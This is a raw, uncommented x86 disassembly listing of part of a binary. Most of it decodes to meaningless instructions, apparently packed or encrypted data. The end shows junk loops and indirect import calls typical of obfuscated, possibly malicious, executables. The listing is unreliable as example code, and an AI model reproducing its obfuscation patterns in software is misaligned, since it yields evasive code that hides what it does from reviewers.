  42293d:	outs   dx,DWORD PTR ds:[esi]
  42293e:	ds mov ebp,0x453f1bcc
  422944:	sbb    al,0xae
  422946:	shl    ch,1
  422948:	test   al,0xc
  42294a:	push   ecx
  42294b:	pop    edx
  42294c:	mov    ecx,DWORD PTR [esi]
  42294e:	je     0x422950
  422950:	pop    ss
  422951:	ror    DWORD PTR ds:0x22f5c1e5,0x72
  422958:	stc    
  422959:	mov    ecx,0x505075cd
  42295e:	pop    ebp
  42295f:	js     0x42297e
  422961:	hlt    
  422962:	test   DWORD PTR [esi-0x607dd278],ecx
  422968:	cmp    DWORD PTR [edi-0x121bc229],ebx
  42296e:	sbb    edi,DWORD PTR [edi-0x78]
  422971:	add    al,0xe3
  422973:	mov    ds:0x7a5bf026,eax
  422978:	inc    ebx
  422979:	fistp  WORD PTR [ebx]
  42297c:	out    0x5,al
  42297e:	icebp  
  42297f:	mov    ds:0xbfadbc07,eax
  422984:	(bad)  
  422985:	shl    DWORD PTR [ecx-0xef92ed6],1
  42298b:	mov    esp,0x97ae53ca
  422990:	dec    ebx
  422991:	rcr    BYTE PTR [edi],0x1f
  422994:	sgdtd  es:[ebx]
  422998:	gs push edx
  42299a:	adc    BYTE PTR [edi+0x1a],0x17
  42299e:	fldenv [eax-0x53]
  4229a1:	(bad)  
  4229a2:	push   ebx
  4229a3:	cmp    al,0x3b
  4229a5:	popf   
  4229a6:	outs   dx,DWORD PTR ds:[esi]
  4229a7:	pop    ss
  4229a8:	jmp    0x6fe0:0x7f24224b
  4229af:	imul   ebx,DWORD PTR [edi],0xac4b7fb4
  4229b5:	pop    ebp
  4229b6:	dec    esi
  4229b7:	push   edi
  4229b8:	aas    
  4229b9:	call   DWORD PTR [eax+eiz*2]
  4229bc:	sub    bh,BYTE PTR [eax*1-0x1ee9cf28]
  4229c3:	cmp    eax,0xbc59f941
  4229c8:	push   ebx
  4229c9:	repz js 0x422a1f
  4229cc:	adc    BYTE PTR [edi-0x74c744c5],ch
  4229d2:	adc    BYTE PTR [edi-0x40bbd2f0],dl
  4229d8:	repz shr al,1
  4229db:	xchg   esp,eax
  4229dc:	outs   dx,BYTE PTR ds:[esi]
  4229dd:	and    edx,edx
  4229df:	in     al,dx
  4229e0:	stos   DWORD PTR es:[edi],eax
  4229e1:	jle    0x422a50
  4229e3:	inc    esp
  4229e4:	inc    edi
  4229e5:	sbb    esi,DWORD PTR [ebx+0x1a]
  4229e8:	inc    esp
  4229e9:	inc    DWORD PTR [esp+ebp*4+0x745b8223]
  4229f0:	pop    ebp
  4229f1:	pop    ss
  4229f2:	je     0x422a06
  4229f4:	fnstenv [edx+0x2d0ba42c]
  4229fa:	xor    DWORD PTR fs:[esi+edi*2-0x6e],0x32
  422a00:	xchg   BYTE PTR [edi],dh
  422a02:	mov    bh,0x2f
  422a04:	push   eax
  422a05:	js     0x422a1f
  422a07:	inc    esp
  422a08:	pushf  
  422a09:	imul   esi,DWORD PTR [eax+edx*2],0xffffffba
  422a0d:	xchg   ebx,eax
  422a0e:	stos   DWORD PTR es:[edi],eax
  422a0f:	cmp    BYTE PTR [edx],ch
  422a11:	fisttp WORD PTR [edi+edi*1]
  422a14:	mov    edx,0x87c918d7
  422a19:	and    ecx,ecx
  422a1b:	jns    0x4229a0
  422a1d:	test   DWORD PTR [edx+0x48],edi
  422a20:	fstp   TBYTE PTR [eax]
  422a22:	lds    esi,FWORD PTR [eax]
  422a24:	int3   
  422a25:	sub    BYTE PTR [esi-0x56],al
  422a28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a29:	in     eax,dx
  422a2a:	cmp    ecx,DWORD PTR [edx+0xbdc451b]
  422a30:	mov    WORD PTR [eax],?
  422a32:	sbb    dl,dh
  422a34:	imul   esp,edi,0x47
  422a37:	add    bh,BYTE PTR [edx]
  422a39:	sub    BYTE PTR [edi-0x65b9c6de],ah
  422a3f:	cdq    
  422a40:	dec    ebp
  422a41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a42:	pushf  
  422a43:	fcom   st(4)
  422a45:	add    esi,DWORD PTR [esi]
  422a47:	sbb    eax,DWORD PTR [ebx+0x5c706610]
  422a4d:	stc    
  422a4e:	jg     0x422a27
  422a50:	xchg   ebp,eax
  422a51:	inc    esp
  422a52:	mov    eax,DWORD PTR [ebx-0x34adec2a]
  422a58:	push   eax
  422a59:	xchg   esp,eax
  422a5a:	lds    edx,FWORD PTR [esi]
  422a5c:	inc    edi
  422a5d:	addr16 (bad) 
  422a5f:	jmp    0x1357:0xf9e7ef12
  422a66:	loope  0x422a43
  422a68:	dec    ecx
  422a69:	mov    BYTE PTR ds:0xf53953b9,ch
  422a6f:	add    eax,0x598e97c3
  422a74:	sbb    BYTE PTR [edi+ebx*2-0x7014c751],dh
  422a7b:	push   ebp
  422a7c:	sub    DWORD PTR [esi],edx
  422a7e:	xor    dh,BYTE PTR [edi+0x56717ffb]
  422a84:	sub    ch,BYTE PTR [edx-0x4a]
  422a87:	inc    edx
  422a88:	icebp  
  422a89:	add    ch,BYTE PTR [ebx+edx*4-0x55]
  422a8d:	and    BYTE PTR [ecx],ch
  422a8f:	gs ins DWORD PTR es:[edi],dx
  422a91:	push   cs
  422a92:	arpl   WORD PTR [edi],si
  422a94:	mov    ch,0xea
  422a96:	shr    cl,0xb8
  422a99:	jmp    0x42c8:0x6989f703
  422aa0:	and    DWORD PTR [edi*1-0x3c4d7a12],eax
  422aa7:	jp     0x422a2b
  422aa9:	mov    di,0xd5fc
  422aad:	ficomp DWORD PTR [edx*2+0x7a7172ff]
  422ab4:	vaddss xmm5,xmm6,DWORD PTR [edx]
  422ab8:	scas   eax,DWORD PTR es:[edi]
  422ab9:	sbb    bl,BYTE PTR [esi-0x46]
  422abc:	nop
  422abd:	dec    ebx
  422abe:	and    al,0xeb
  422ac0:	fldcw  WORD PTR [edx-0x2c]
  422ac3:	nop
  422ac4:	cmp    ch,BYTE PTR [ebx]
  422ac6:	jecxz  0x422b1e
  422ac8:	dec    esp
  422ac9:	and    DWORD PTR [ecx],ecx
  422acb:	pop    ebp
  422acc:	add    ah,BYTE PTR [edx-0x7734aa86]
  422ad2:	rcl    DWORD PTR [esi-0x10b83390],1
  422ad8:	repnz xor eax,0x626725d9
  422ade:	cmp    dh,al
  422ae0:	(bad)  
  422ae2:	ins    DWORD PTR es:[edi],dx
  422ae3:	push   0x3b422f15
  422ae8:	in     eax,dx
  422ae9:	dec    ebx
  422aea:	sbb    BYTE PTR [esi+0x60bdb19c],dl
  422af0:	inc    ecx
  422af1:	push   0xffffffd4
  422af3:	xlat   BYTE PTR ds:[ebx]
  422af4:	push   edi
  422af5:	or     eax,0x491efce0
  422afa:	dec    eax
  422afb:	ins    BYTE PTR es:[edi],dx
  422afc:	lahf   
  422afd:	repnz es dec ebp
  422b00:	mov    ds:0x8218d355,al
  422b05:	das    
  422b06:	inc    ebp
  422b07:	inc    esi
  422b09:	aam    0xf1
  422b0b:	sub    cl,ch
  422b0d:	popf   
  422b0e:	stc    
  422b0f:	ja     0x8886b606
  422b15:	cs mov dl,0x54
  422b18:	mov    al,ds:0xb9f8ffc5
  422b1d:	(bad)  
  422b1e:	mov    esp,0x8215144d
  422b23:	jg     0x422aa5
  422b25:	(bad)  
  422b26:	pop    edx
  422b27:	pop    ecx
  422b28:	add    eax,DWORD PTR [esi]
  422b2a:	dec    ebp
  422b2b:	mov    ebp,0x9949db6f
  422b30:	push   eax
  422b31:	and    DWORD PTR [edi-0x5b],ecx
  422b34:	cdq    
  422b35:	stos   BYTE PTR es:[edi],al
  422b36:	push   cs
  422b37:	stos   BYTE PTR es:[edi],al
  422b38:	data16 ins BYTE PTR es:[edi],dx
  422b3a:	cld    
  422b3b:	mov    eax,DWORD PTR [esi+0x591318db]
  422b41:	lods   eax,DWORD PTR ds:[esi]
  422b42:	fsubr  DWORD PTR [edx]
  422b44:	jmp    0x422b22
  422b46:	adc    BYTE PTR [ecx],ah
  422b48:	es mov bl,0xea
  422b4b:	push   esp
  422b4c:	fisubr DWORD PTR [ebp+edx*1+0x19]
  422b50:	add    DWORD PTR [esi],edi
  422b52:	cli    
  422b53:	jo     0x422bb8
  422b55:	jbe    0x422b2f
  422b57:	test   eax,0x785c32f8
  422b5c:	inc    edx
  422b5d:	mov    ch,0xf4
  422b5f:	pop    ebp
  422b60:	xor    DWORD PTR [ecx],ebx
  422b62:	out    dx,eax
  422b63:	fimul  WORD PTR [ebx]
  422b65:	cwde   
  422b66:	(bad)  
  422b68:	push   cs
  422b69:	(bad)  
  422b6a:	cmp    ah,ah
  422b6c:	int    0x1b
  422b6e:	out    dx,eax
  422b6f:	fwait
  422b70:	jg     0x422be3
  422b72:	xor    al,0xf5
  422b74:	pop    es
  422b75:	pop    ds
  422b76:	add    al,BYTE PTR [esi+0x6a7a8d88]
  422b7c:	fwait
  422b7d:	and    edx,edx
  422b7f:	ret    0xa5a
  422b82:	push   esp
  422b83:	iret   
  422b84:	enter  0xc3c8,0xd7
  422b88:	lahf   
  422b89:	inc    ebx
  422b8a:	xor    eax,0xdf800f25
  422b8f:	(bad)  
  422b90:	imul   cl
  422b92:	pop    ds
  422b93:	sbb    BYTE PTR [edi-0x63],al
  422b96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b97:	sub    DWORD PTR [ebx-0x1db3b09a],ecx
  422b9d:	scas   eax,DWORD PTR es:[edi]
  422b9e:	add    bh,dh
  422ba0:	sub    eax,0xd4bd31ed
  422ba5:	and    bl,BYTE PTR [ebx-0x100ace50]
  422bab:	or     BYTE PTR [esi+ecx*2-0x7f],0xaf
  422bb0:	adc    BYTE PTR [ecx+0x3093db6d],cl
  422bb6:	ret    
  422bb7:	aas    
  422bb8:	inc    esi
  422bb9:	rcl    esi,0xf3
  422bbc:	out    0xc2,al
  422bbe:	daa    
  422bbf:	dec    esi
  422bc0:	adc    eax,0x8f50f4
  422bc5:	ins    DWORD PTR es:[edi],dx
  422bc6:	sahf   
  422bc7:	sub    cl,BYTE PTR [edx]
  422bc9:	adc    ah,BYTE PTR [edx-0x2]
  422bcc:	jecxz  0x422b58
  422bce:	test   DWORD PTR [esp+edi*1-0x49],0x89157ccd
  422bd6:	pusha  
  422bd7:	(bad)  
  422bd8:	dec    ebx
  422bd9:	jle    0x422c30
  422bdb:	mov    bl,0x3e
  422bdd:	icebp  
  422bde:	sti    
  422bdf:	scas   al,BYTE PTR es:[edi]
  422be0:	out    dx,al
  422be1:	pop    ds
  422be2:	xadd   esp,ebx
  422be5:	cmp    edi,DWORD PTR [edi]
  422be7:	mov    bl,0xe1
  422be9:	stos   BYTE PTR es:[edi],al
  422bea:	sbb    eax,0xfbc4fee8
  422bef:	int    0xc7
  422bf1:	or     edx,esp
  422bf3:	adc    BYTE PTR [edx-0x7ac11cd8],bl
  422bf9:	xchg   edx,eax
  422bfa:	int3   
  422bfb:	pop    ss
  422bfc:	fmulp  st(2),st
  422bfe:	lds    eax,FWORD PTR [ebp-0x14]
  422c01:	inc    eax
  422c02:	cmp    eax,0xa170deb8
  422c07:	jmp    DWORD PTR [ecx-0x6]
  422c0a:	retf   0x32d1
  422c0d:	cli    
  422c0e:	retf   0x1c12
  422c11:	data16 ror BYTE PTR [ebx-0x2e],1
  422c15:	ds jg  0x422bd3
  422c18:	add    eax,0x9f815c9
  422c1d:	out    0x40,eax
  422c1f:	call   0x6b07:0xf366358e
  422c26:	repz push ecx
  422c28:	je     0x422c77
  422c2a:	dec    esp
  422c2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c2c:	aas    
  422c2d:	into   
  422c2e:	outs   dx,DWORD PTR ds:[esi]
  422c2f:	adc    ecx,esi
  422c31:	add    eax,0x4d4f8fee
  422c36:	ins    DWORD PTR es:[edi],dx
  422c37:	bound  ebx,QWORD PTR [ebp+0x59855d9]
  422c3d:	mov    edx,0xb7f88ad0
  422c42:	push   ebx
  422c43:	fistp  QWORD PTR [ebp+ebx*2+0x6fdfd03e]
  422c4a:	cmp    al,0xb9
  422c4c:	clc    
  422c4d:	xchg   ebp,eax
  422c4e:	adc    dh,bh
  422c50:	xor    ah,BYTE PTR [esi+0x10]
  422c53:	mov    ah,0x3b
  422c55:	add    DWORD PTR [edx-0x649d5ad7],ebp
  422c5b:	scas   eax,DWORD PTR es:[edi]
  422c5c:	shr    DWORD PTR fs:[edx],cl
  422c5f:	xor    eax,DWORD PTR [ebp-0x7f]
  422c62:	xor    BYTE PTR ds:0x9a841047,dh
  422c68:	add    DWORD PTR [edi+0x26],edx
  422c6b:	push   edx
  422c6c:	ficom  WORD PTR [esi]
  422c6e:	xchg   ebx,eax
  422c6f:	xchg   esp,eax
  422c70:	mov    cl,0xaf
  422c72:	push   0x994f6385
  422c77:	mov    DWORD PTR [ebp+0x24],ebx
  422c7a:	loop   0x422c43
  422c7c:	xchg   DWORD PTR [eax+0x30],edi
  422c7f:	nop
  422c80:	xor    al,0xdf
  422c82:	sbb    al,0xc4
  422c84:	jecxz  0x422c0e
  422c86:	das    
  422c87:	or     ah,bl
  422c89:	iretw  
  422c8b:	xor    DWORD PTR [ebp+0x65],ebp
  422c8e:	out    dx,al
  422c8f:	adc    eax,0xf9d4ecc3
  422c94:	retf   0x2fe9
  422c97:	jmp    0x96394d21
  422c9c:	je     0x422c2b
  422c9e:	(bad)  
  422c9f:	pop    ds
  422ca0:	cmp    al,0x19
  422ca2:	jnp    0x422cf2
  422ca4:	dec    ecx
  422ca5:	mov    ebp,0x6fcc1422
  422caa:	stos   BYTE PTR es:[edi],al
  422cab:	(bad)  
  422cac:	stc    
  422cad:	mov    DWORD PTR [edx-0x58],eax
  422cb0:	cld    
  422cb1:	cmc    
  422cb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422cb3:	mov    al,0xf
  422cb5:	stos   DWORD PTR es:[edi],eax
  422cb6:	mov    ds:0xc918ee86,eax
  422cbb:	jb     0x422c84
  422cbd:	pop    ds
  422cbe:	jl     0x422d31
  422cc0:	(bad)  
  422cc1:	jns    0x422cfd
  422cc3:	call   0xd4a1:0xaafeba37
  422cca:	imul   DWORD PTR [ebx+0x2c7459e6]
  422cd0:	or     ch,BYTE PTR [edi-0x69]
  422cd3:	test   DWORD PTR [edx],ebx
  422cd5:	call   edx
  422cd7:	fisubr WORD PTR [ebx]
  422cd9:	sbb    ebp,DWORD PTR [ecx]
  422cdb:	icebp  
  422cdc:	loop   0x422d28
  422cde:	fidiv  DWORD PTR [edx]
  422ce0:	popf   
  422ce1:	imul   esp,DWORD PTR [edi],0xffffffd6
  422ce4:	add    DWORD PTR [di],ebx
  422ce7:	ror    BYTE PTR gs:[edx-0x24652f34],1
  422cee:	aaa    
  422cef:	xor    eax,0x29053229
  422cf4:	sub    edi,DWORD PTR [esi-0x23a10fd1]
  422cfa:	adc    eax,0xa442c329
  422cff:	or     al,0x1
  422d01:	mov    eax,ds:0x79d5feca
  422d06:	mov    ebx,0x3ac94663
  422d0b:	jle    0x422d6b
  422d0d:	loopne 0x422d6f
  422d0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d10:	movntps XMMWORD PTR ss:[ebp+ecx*2-0x6061f0ed],xmm3
  422d19:	sub    ebp,DWORD PTR [eax]
  422d1b:	out    0x2e,al
  422d1d:	dec    esp
  422d1e:	pop    eax
  422d1f:	or     edi,DWORD PTR [esi+esi*2+0x39]
  422d23:	rcl    BYTE PTR [esi],0xd9
  422d26:	hlt    
  422d27:	ror    bl,0xa7
  422d2a:	fwait
  422d2b:	mov    al,0x1e
  422d2d:	enter  0x5cdc,0x73
  422d31:	mov    BYTE PTR [edi+0x6591d698],ch
  422d37:	pusha  
  422d38:	call   0xcdf1:0xb4af5dbd
  422d3f:	sbb    eax,DWORD PTR [edi]
  422d41:	mov    ds:0x7fc84b54,eax
  422d46:	out    dx,al
  422d47:	mov    bl,BYTE PTR [edx-0x17]
  422d4a:	ja     0x422cda
  422d4c:	scas   al,BYTE PTR es:[edi]
  422d4d:	dec    ebp
  422d4e:	inc    edi
  422d4f:	cmp    eax,DWORD PTR [edx]
  422d51:	sub    DWORD PTR [edx-0x5df7d28c],ecx
  422d57:	jno    0x422d0e
  422d59:	or     DWORD PTR gs:[edx],0x6dc43480
  422d60:	xchg   ebx,eax
  422d61:	xlat   BYTE PTR ds:[ebx]
  422d62:	aas    
  422d63:	jmp    0x422cee
  422d65:	sbb    edx,ebx
  422d67:	dec    edi
  422d68:	es cmp eax,0xf8add99d
  422d6e:	lahf   
  422d6f:	jo     0x422d7f
  422d71:	add    dl,BYTE PTR [eax-0x3c]
  422d74:	inc    ebx
  422d75:	and    eax,0x895b52f4
  422d7a:	jne    0x422d7b
  422d7c:	call   0x13b5:0x2b255242
  422d83:	(bad)  [ebp+esi*4+0x792321b7]
  422d8a:	jmp    0x6db9:0x938383f
  422d91:	cs or  al,0xd4
  422d94:	cmc    
  422d95:	xchg   edx,eax
  422d96:	mov    ds:0xe38cdba,al
  422d9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d9c:	xchg   BYTE PTR [ebx+0x25],bh
  422d9f:	xor    eax,0xae59f4df
  422da4:	rcl    eax,1
  422da6:	adc    al,0xf4
  422da8:	aas    
  422da9:	stos   DWORD PTR es:[edi],eax
  422daa:	sbb    DWORD PTR [ebx],edi
  422dac:	shl    al,0x1f
  422daf:	idiv   WORD PTR [ebx+0x69]
  422db3:	xchg   esi,edx
  422db5:	gs in  al,dx
  422db7:	cdq    
  422db8:	fldcw  WORD PTR [edi]
  422dba:	ror    DWORD PTR [ebx],cl
  422dbc:	dec    esi
  422dbd:	cmp    BYTE PTR ds:0xd31d25d9,0xb4
  422dc4:	inc    ebx
  422dc5:	xchg   esp,eax
  422dc6:	jmp    0x16d:0xc6dca4d0
  422dcd:	lds    eax,FWORD PTR [edi+eax*8-0x24baf5fc]
  422dd4:	add    DWORD PTR [edi-0x3d2c104a],edi
  422dda:	outs   dx,DWORD PTR ds:[esi]
  422ddb:	not    BYTE PTR [ecx+0x24]
  422dde:	jl     0x422dbb
  422de0:	kandnw k4,k1,k4
  422de4:	icebp  
  422de5:	mov    esi,0x2dd2c6e8
  422dea:	std    
  422deb:	sub    eax,0x85754ed2
  422df0:	push   edx
  422df1:	xchg   ebp,eax
  422df2:	push   ss
  422df3:	je     0x422da3
  422df5:	pop    es
  422df6:	mov    ecx,0x9962845f
  422dfb:	push   0x12be5037
  422e00:	arpl   bp,cx
  422e02:	jae    0x422dc0
  422e04:	sub    BYTE PTR [ebx],dh
  422e06:	mov    bh,0x5b
  422e08:	mov    esi,0xf15e931f
  422e0d:	sbb    bh,BYTE PTR [ebp+edx*2-0x868d889]
  422e14:	inc    esi
  422e15:	and    ebx,DWORD PTR [esi+0x16]
  422e18:	cs push eax
  422e1a:	cld    
  422e1b:	(bad)  
  422e1c:	push   ss
  422e1d:	(bad)  
  422e1e:	cdq    
  422e1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e20:	imul   edx,DWORD PTR [eax],0xb753810b
  422e26:	or     al,0xfc
  422e28:	shl    ch,0x8a
  422e2b:	icebp  
  422e2c:	jg     0x422e31
  422e2e:	loope  0x422e0b
  422e30:	mov    BYTE PTR [ebx+0x6d7462ef],cl
  422e36:	jne    0x422ead
  422e38:	das    
  422e39:	mov    eax,DWORD PTR [edx]
  422e3b:	and    al,0x8e
  422e3d:	mov    ah,0x68
  422e3f:	sub    DWORD PTR [edi+0x29],ebx
  422e42:	push   edi
  422e43:	cwde   
  422e44:	mov    al,ds:0x4c7c1071
  422e49:	lock jp 0x422e2c
  422e4c:	adc    al,0xb4
  422e4e:	mov    eax,ds:0x3debd8de
  422e53:	push   eax
  422e54:	mov    dh,0x2c
  422e56:	ins    BYTE PTR es:[edi],dx
  422e57:	stos   BYTE PTR es:[edi],al
  422e58:	add    bl,dh
  422e5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e5b:	sahf   
  422e5c:	dec    esi
  422e5d:	(bad)  
  422e5f:	jmp    0xcc1448da
  422e64:	jne    0x422ee4
  422e66:	add    esi,DWORD PTR [ebx+eiz*1+0x78]
  422e6a:	or     DWORD PTR [esi-0x23ea97c9],esp
  422e70:	mov    ds:0x877081f1,al
  422e75:	push   ds
  422e76:	push   edi
  422e77:	sbb    al,0xc1
  422e79:	inc    BYTE PTR [esi+0x30c5f3a4]
  422e7f:	adc    al,bh
  422e81:	icebp  
  422e82:	mov    ebp,0x36c6b7c3
  422e87:	push   eax
  422e88:	dec    ebx
  422e89:	push   cs
  422e8a:	sbb    esp,DWORD PTR [esi]
  422e8c:	jne    0x422edf
  422e8e:	dec    ecx
  422e8f:	fild   QWORD PTR [eax-0x5a18882e]
  422e95:	push   esi
  422e96:	push   edx
  422e97:	and    cl,BYTE PTR [ebx-0x5a]
  422e9a:	jo     0x422eff
  422e9c:	lock fwait
  422e9e:	cmp    eax,0xeaa1bd99
  422ea3:	and    eax,0x8066d0a0
  422ea8:	pop    edx
  422ea9:	mov    bl,0x3a
  422eab:	jmp    0x57f4:0xc0583616
  422eb2:	shl    edx,1
  422eb4:	stos   BYTE PTR es:[edi],al
  422eb5:	pop    eax
  422eb6:	shr    BYTE PTR [ebx+0x47b62bc1],1
  422ebc:	jae    0x422e76
  422ebe:	(bad)  
  422ebf:	loopne 0x422f3c
  422ec1:	data16 mov ds:0x8cf6ab2b,al
  422ec7:	push   esp
  422ec8:	mov    bl,0xa7
  422eca:	push   cs
  422ecb:	retf   
  422ecc:	in     eax,dx
  422ecd:	outs   dx,DWORD PTR ds:[esi]
  422ece:	and    al,BYTE PTR [edx+0x49]
  422ed1:	ror    BYTE PTR ds:0x432ee87e,1
  422ed7:	jle    0x422f39
  422ed9:	or     al,0x79
  422edb:	fsubr  st(6),st
  422edd:	lock fadd DWORD PTR ds:0x7469d1ad
  422ee4:	shl    DWORD PTR [esi-0x55964bab],1
  422eea:	loop   0x422ed2
  422eec:	and    DWORD PTR [eax+0x6c5de7a0],0x1d
  422ef3:	(bad)  
  422ef4:	cli    
  422ef5:	mov    DWORD PTR [ebx+ebx*2+0x37826522],0xcc08d287
  422f00:	ds mov cl,0x46
  422f03:	ins    BYTE PTR es:[edi],dx
  422f04:	mov    DWORD PTR [ebx-0x71],esp
  422f07:	pop    edx
  422f08:	or     BYTE PTR [edx],0x46
  422f0b:	outs   dx,DWORD PTR ds:[esi]
  422f0c:	js     0x422f6b
  422f0e:	cwde   
  422f0f:	hlt    
  422f10:	fadd   DWORD PTR [ebp-0x21]
  422f13:	push   edi
  422f14:	cli    
  422f15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f16:	push   ebx
  422f17:	mov    bh,0x7e
  422f19:	iret   
  422f1a:	jmp    0x5321fab6
  422f1f:	arpl   WORD PTR [esi],si
  422f21:	repnz fmul st,st(6)
  422f24:	stc    
  422f25:	fsub   st,st(7)
  422f27:	ins    BYTE PTR es:[edi],dx
  422f28:	cwde   
  422f29:	icebp  
  422f2a:	push   esp
  422f2b:	out    dx,al
  422f2c:	cwde   
  422f2d:	lods   eax,DWORD PTR ds:[esi]
  422f2e:	add    BYTE PTR [ebp+0x61],ch
  422f31:	xor    ch,BYTE PTR [edx]
  422f33:	or     eax,0xafbd207c
  422f38:	jno    0x422f29
  422f3a:	jns    0x422f27
  422f3c:	add    BYTE PTR [edi-0x80],al
  422f3f:	cmp    al,0x42
  422f41:	(bad)  
  422f42:	mov    cl,0x6f
  422f44:	retf   0x6303
  422f47:	add    edx,DWORD PTR [edx-0x7a226646]
  422f4d:	mov    WORD PTR [esp+edx*1+0x1e],gs
  422f51:	pop    ecx
  422f52:	inc    ebx
  422f53:	int    0x5b
  422f55:	push   ebx
  422f56:	mov    eax,ds:0xe7f7cb75
  422f5b:	and    dh,dl
  422f5d:	sbb    eax,0x3708f0c
  422f62:	iret   
  422f63:	and    ecx,edx
  422f65:	mov    DWORD PTR [ebp-0x4c],ecx
  422f68:	mov    ecx,DWORD PTR [ebp+0x8]
  422f6b:	mov    edx,DWORD PTR [ebp-0x48]
  422f6e:	lea    ecx,[edx+ecx*1+0x241fcdf]
  422f75:	mov    DWORD PTR [ebp-0x48],ecx
  422f78:	mov    ecx,DWORD PTR [ebp+0x8]
  422f7b:	mov    edx,0xfa5e1524
  422f80:	sub    edx,ecx
  422f82:	add    edx,DWORD PTR [ebp-0x44]
  422f85:	mov    DWORD PTR [ebp-0x44],edx
  422f88:	mov    ecx,DWORD PTR [ebp+0x8]
  422f8b:	xor    ecx,eax
  422f8d:	add    ecx,esi
  422f8f:	jne    0x421ef2
  422f95:	mov    ecx,DWORD PTR [ebp-0x8]
  422f98:	xor    ecx,eax
  422f9a:	mov    eax,DWORD PTR [ebp+0x10]
  422f9d:	add    ecx,esi
  422f9f:	mov    DWORD PTR [eax],ecx
  422fa1:	pop    edi
  422fa2:	pop    esi
  422fa3:	pop    ebx
  422fa4:	leave  
  422fa5:	ret    0xc
  422fa8:	push   ebp
  422fa9:	mov    ebp,esp
  422fab:	sub    esp,0x78
  422fae:	and    DWORD PTR ds:0x42a2e2,0x0
  422fb8:	jmp    0x422fca
  422fbd:	mov    ecx,DWORD PTR ds:0x42a2e2
  422fc3:	inc    ecx
  422fc4:	mov    DWORD PTR ds:0x42a2e2,ecx
  422fca:	cmp    DWORD PTR ds:0x42a2e2,0x17
  422fd1:	jae    0x42301e
  422fd7:	cmp    DWORD PTR ds:0x42a2e2,0xb
  422fde:	jbe    0x42301e
  422fe4:	jmp    0x422fff
  422fe9:	push   DWORD PTR [ebp-0x14]
  422fec:	push   0x42a2be
  422ff1:	push   0x8b21
  422ff6:	push   DWORD PTR [ebp-0x1c]
  422ff9:	call   DWORD PTR ds:0x42a3d2
  422fff:	cmp    DWORD PTR ds:0x42a2e2,0xa
  423006:	jne    0x423019
  42300c:	mov    ecx,DWORD PTR ds:0x42a2e2
  423012:	inc    ecx
  423013:	mov    DWORD PTR ds:0x42a2e2,ecx
  423019:	jmp    0x422fbd
  42301e:	push   esi
  42301f:	sbb    DWORD PTR ds:0x42a26e,edx
  423025:	push   edi
  423026:	adc    esi,eax
  423028:	mov    eax,ds:0x42941e
  42302d:	inc    DWORD PTR ds:0x42a2ae
  423033:	mov    DWORD PTR [ebp-0x24],eax
  423036:	mov    DWORD PTR ds:0x42a286,0x12e2
  423040:	mov    eax,ds:0x42953e
  423045:	inc    ecx
  423046:	mov    DWORD PTR [ebp-0x30],eax
  423049:	mov    DWORD PTR ds:0x42a29e,0x10
  423053:	cmp    DWORD PTR ds:0x42a29e,0x0
  42305a:	je     0x4230bc
  423060:	cmp    DWORD PTR ds:0x42a29e,0x9
  423067:	jbe    0x4230bc
  42306d:	jmp    0x423091
  423072:	push   DWORD PTR [ebp-0x24]
  423075:	push   DWORD PTR [ebp-0x18]
  423078:	push   DWORD PTR [ebp-0xc]
  42307b:	push   0x10f9
  423080:	push   DWORD PTR [ebp-0x28]
  423083:	push   DWORD PTR [ebp-0x18]
  423086:	push   0x429211
  42308b:	call   DWORD PTR ds:0x42a3d6
  423091:	cmp    DWORD PTR ds:0x42a29e,0xa
  423098:	jne    0x4230ac
  42309e:	xor    eax,eax
  4230a0:	xor    eax,DWORD PTR ds:0x42a29e
  4230a6:	dec    eax
  4230a7:	mov    ds:0x42a29e,eax
  4230ac:	mov    eax,ds:0x42a29e
  4230b1:	dec    eax
  4230b2:	mov    ds:0x42a29e,eax
  4230b7:	jmp    0x423053
  4230bc:	mov    DWORD PTR [ebp-0x2c],0xf89c85a5
  4230c3:	mov    DWORD PTR ds:0x42a26a,0x16
  4230cd:	cmp    DWORD PTR ds:0x42a26a,0x0
  4230d4:	je     0x423106
  4230da:	cmp    DWORD PTR ds:0x42a26a,0x20
  4230e1:	jg     0x423106
  4230e7:	jmp    0x4230f2
  4230ec:	call   DWORD PTR ds:0x42a3da
  4230f2:	xor    edi,edi
  4230f4:	add    edi,DWORD PTR ds:0x42a26a
  4230fa:	dec    edi
  4230fb:	mov    DWORD PTR ds:0x42a26a,edi
  423101:	jmp    0x4230cd
  423106:	mov    DWORD PTR [ebp-0x28],0xf89c85ba
  42310d:	mov    eax,DWORD PTR [ebp-0x10]
  423110:	mov    ecx,DWORD PTR [ebp-0x10]
  423113:	xor    esi,esi
  423115:	xor    esi,DWORD PTR ds:0x42a286
  42311b:	xor    DWORD PTR ds:0x42a2f6,esi
  423121:	sub    eax,ecx
  423123:	or     ecx,esi
  423125:	mov    DWORD PTR [ebp-0x10],eax
  423128:	xor    DWORD PTR [ebp-0x10],0xf89cb5a5
  42312f:	add    DWORD PTR ds:0x42a26a,0x2e29
  423139:	mov    eax,DWORD PTR [ebp-0x18]
  42313c:	sbb    DWORD PTR ds:0x42a272,0x6ecf
  423146:	mov    ecx,DWORD PTR [ebp-0x18]
  423149:	add    DWORD PTR ds:0x42a256,0x42a29a
  423153:	sub    eax,ecx
  423155:	adc    DWORD PTR ds:0x42a302,edi
  42315b:	mov    DWORD PTR [ebp-0x18],eax
  42315e:	add    DWORD PTR ds:0x42a2fe,ecx
  423164:	or     DWORD PTR [ebp-0x18],0xf89f05a5
  42316b:	adc    DWORD PTR ds:0x42a26a,0x287e
  423175:	mov    eax,DWORD PTR [ebp-0xc]
  423178:	adc    esi,esi
  42317a:	mov    ecx,DWORD PTR [ebp-0xc]
  42317d:	sub    eax,ecx
  42317f:	xor    DWORD PTR ds:0x42a2b6,0x51ed
  423189:	mov    DWORD PTR [ebp-0xc],eax
  42318c:	and    DWORD PTR ds:0x42a2ae,0x0
  423196:	mov    edi,DWORD PTR ds:0x42a2ae
  42319c:	inc    edi
